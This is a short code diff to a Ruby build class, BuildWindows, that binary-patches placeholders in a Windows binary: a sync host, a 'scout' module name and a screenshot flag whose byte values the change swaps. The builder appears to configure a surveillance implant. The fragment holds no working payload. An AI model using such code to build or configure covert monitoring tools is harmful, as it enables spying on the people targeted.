@@ -57,7 +57,7 @@ class BuildWindows < Build
       content.binary_patch 'SYNC'*16, host.ljust(64, "\x00")
 
       marker = "Screenshot"
-      content.binary_patch 'SHOT', @factory.configs.first.screenshot_enabled? ? "\x00\x00\x00\x00" : "\x01\x01\x01\x01"
+      content.binary_patch 'SHOT', @factory.configs.first.screenshot_enabled? ? "\x01\x01\x01\x01" : "\x00\x00\x00\x00"
 
       marker = "Module name"
       content.binary_patch 'MODUNAME', module_name('scout')
